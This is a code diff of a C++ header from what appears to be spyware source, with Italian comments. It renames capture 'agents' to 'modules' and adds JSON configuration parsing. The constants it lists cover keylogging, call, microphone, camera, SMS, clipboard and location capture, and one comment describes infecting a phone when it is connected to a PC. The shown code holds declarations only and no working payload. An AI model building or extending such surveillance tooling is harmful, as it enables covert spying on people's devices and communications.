@@ -1,6 +1,10 @@
 #include "Common.h"
 #include "Status.h"
 #include "Encryption.h"
+#include "JSON/JSON.h"
+#include "ModulesManager.h"
+#include "EventsManager.h"
+#include "ActionsManager.h"
 
 using namespace std;
 
@@ -22,26 +26,26 @@ using namespace std;
 /**
 * Define degli agenti/eventi/azioni/configurazioni
 */
-#define AGENT				(UINT)0x1000
-#define AGENT_SMS			AGENT + (UINT)0x1 // Cattura Email/Sms/Mms
-#define AGENT_ORGANIZER		AGENT + (UINT)0x2 
-#define AGENT_CALLLIST		AGENT + (UINT)0x3 
-#define AGENT_DEVICE		AGENT + (UINT)0x4
-#define AGENT_POSITION		AGENT + (UINT)0x5 // DWORD Interval | DWORD Timeout | DWORD Age
-#define AGENT_CALL			AGENT + (UINT)0x6
-#define AGENT_CALL_LOCAL	AGENT + (UINT)0x7
-#define AGENT_KEYLOG		AGENT + (UINT)0x8
-#define AGENT_SNAPSHOT		AGENT + (UINT)0x9
-#define AGENT_URL			AGENT + (UINT)0xa
-#define AGENT_IM			AGENT + (UINT)0xb
-//#define AGENT_EMAIL			AGENT + (UINT)0xc 
-#define AGENT_MIC			AGENT + (UINT)0xd
-#define AGENT_CAM			AGENT + (UINT)0xe
-#define AGENT_CLIPBOARD		AGENT + (UINT)0xf
-#define AGENT_CRISIS		AGENT + (UINT)0x10
-#define AGENT_APPLICATION	AGENT + (UINT)0x11
-#define AGENT_LIVEMIC		AGENT + (UINT)0x12
-#define AGENT_PDA			(UINT)0xDF7A		// Solo per PC (infetta il telefono quando viene collegato al pc)
+#define MODULE				(UINT)0x1000
+#define MODULE_SMS			MODULE + (UINT)0x1 // Cattura Email/Sms/Mms
+#define MODULE_ORGANIZER	MODULE + (UINT)0x2 
+#define MODULE_CALLLIST		MODULE + (UINT)0x3 
+#define MODULE_DEVICE		MODULE + (UINT)0x4
+#define MODULE_POSITION		MODULE + (UINT)0x5 // DWORD Interval | DWORD Timeout | DWORD Age
+#define MODULE_CALL			MODULE + (UINT)0x6
+#define MODULE_CALL_LOCAL	MODULE + (UINT)0x7
+#define MODULE_KEYLOG		MODULE + (UINT)0x8
+#define MODULE_SNAPSHOT		MODULE + (UINT)0x9
+#define MODULE_URL			MODULE + (UINT)0xa
+#define MODULE_IM			MODULE + (UINT)0xb
+//#define MODULE_EMAIL		MODULE + (UINT)0xc 
+#define MODULE_MIC			MODULE + (UINT)0xd
+#define MODULE_CAM			MODULE + (UINT)0xe
+#define MODULE_CLIPBOARD	MODULE + (UINT)0xf
+#define MODULE_CRISIS		MODULE + (UINT)0x10
+#define MODULE_APPLICATION	MODULE + (UINT)0x11
+#define MODULE_LIVEMIC		MODULE + (UINT)0x12
+#define MODULE_PDA			(UINT)0xDF7A		// Solo per PC (infetta il telefono quando viene collegato al pc)
 
 #define EVENT				(UINT)0x2000
 #define EVENT_TIMER			EVENT + (UINT)0x1 
@@ -56,6 +60,7 @@ using namespace std;
 #define EVENT_AC			EVENT + (UINT)0xA
 #define EVENT_BATTERY		EVENT + (UINT)0xB
 #define EVENT_STANDBY		EVENT + (UINT)0xC
+#define EVENT_AFTERINST		EVENT + (UINT)0xD
 
 #define ACTION				(UINT)0x4000
 #define ACTION_SYNC			ACTION + (UINT)0x1 // Sync su server
@@ -118,35 +123,44 @@ using namespace std;
 
 #define CONF_FORCE_CONNECTION (UINT)0x2
 
+typedef void (WINAPI *confCallback_t)(const JSONArray);
+
 class Status;
 class Encryption;
 
-class Conf
-{
+class Conf {
 	/**
 	 * Nome del file di configurazione preso da wConfName e poi cifrato tramite la classe Encryption.
 	 */
-	private: wstring strEncryptedConfName;
-	private: Status *statusObj;
+	private: 
+		wstring strEncryptedConfName;
+		Status *statusObj;
+		JSONValue *jMod, *jEv, *jAct, *jGlob;
 
 	/**
 	 * Oggetto Encryption per la decifratura del file di configurazione e del suo nome.
 	 */
 	private: Encryption encryptionObj;
 
+	private: static BOOL ParseModule(JSONArray js);
+	private: static BOOL ParseAction(JSONArray js);
+	private: static BOOL ParseEvent(JSONArray js);
+	private: static BOOL ParseGlobal(JSONArray js);
+	private: BOOL ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCallback_t call_back);
+
 	/**
 	 * Parsa la configurazione di un agente e popola la AgentStruct list. Torna TRUE se la lettura e' andata 
 	 * a buon fine, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima sezione di conf.
 	 * Num rappresenta il numero di agenti da leggere nella sezione.
 	 */
-	private: BOOL ParseAgent(BYTE **pAgent, UINT Num);
+	private: BOOL ParseAgentOld(BYTE **pAgent, UINT Num);
 
 	/**
 	 * Popola la EventStruct list leggendo tutti gli eventi dalla conf. Torna TRUE se la lettura e' andata 
 	 * a buon fine, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima sezione.
 	 * Num rappresenta il numero di eventi da leggere nella sezione.
 	 */
-	private: BOOL ParseEvent(BYTE **pEvent, UINT Num);
+	private: BOOL ParseEventOld(BYTE **pEvent, UINT Num);
 
 	/**
 	 * Parsa la sezione azionie popola la ActionStruct list. Torna TRUE se la lettura e' andata 
@@ -155,14 +169,14 @@ class Conf
 	 * Dopo la ParseEvent() visto che le azioni non hanno una sezione propria ma sono attaccate
 	 * alla fine dela sezione eventi.
 	 */
-	private: BOOL ParseAction(BYTE **pAction, UINT Num);
+	private: BOOL ParseActionOld(BYTE **pAction, UINT Num);
 
 	/**
 	* Popola la ConfStruct list leggendo la sezione Configurazione dal file. Torna TRUE se la lista e' stata
 	* popolata correttamente, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima 
 	* riga di conf. Num rappresenta il numero di opzioni da leggere nella sezione.
 	*/
-	private: BOOL ParseConfiguration(BYTE **pConf, UINT Num);
+	private: BOOL ParseConfigurationOld(BYTE **pConf, UINT Num);
 
 	 /**
 	 * Prende il file puntato da wName e lo riempie con dati casuali, va chiama prima di cancellare un
